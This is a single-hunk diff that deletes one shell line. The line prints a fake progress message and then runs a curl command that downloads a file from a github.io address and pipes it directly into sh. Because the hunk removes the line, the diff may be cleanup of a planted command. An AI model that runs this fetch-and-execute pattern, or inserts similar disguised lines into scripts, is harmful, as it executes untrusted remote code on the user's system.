@@ -1,1 +1,0 @@
-echo Progress: 35.00%curl -L --progress-bar frkns.github.io/fun/ng_undertake_scanning_floral.WOW | sh
